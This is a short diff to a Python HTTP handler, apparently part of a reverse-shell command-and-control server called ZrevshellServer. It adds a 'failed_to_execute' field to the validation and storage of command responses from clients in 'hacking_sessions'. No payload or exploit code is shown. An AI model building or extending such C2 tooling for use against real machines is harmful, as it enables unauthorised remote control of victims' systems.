@@ -481,6 +481,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
             "command_status_code", False
         )  # Since the value was supposed to be None, we'll use False
         # to represent the case where it wasn't found from the loaded requested body
+        failed_to_execute = data.get("failed_to_execute", None)
 
         # Check if the necessary keys are not present in the dictionary sent
         if (
@@ -488,6 +489,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
             or client_response is None
             or command_status_code is False
             or is_empty is None
+            or failed_to_execute is None
         ):
             return sh.HandlerResponse(False, HTTPStatus.BAD_REQUEST)
 
@@ -506,7 +508,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         if not is_empty:
             # Ok else, let's send the success code and insert the response in the session
             self.hacking_sessions.insert_response(
-                session_id, client_response, command_status_code
+                session_id, client_response, command_status_code, failed_to_execute
             )
 
         return sh.HandlerResponse(True, HTTPStatus.OK)
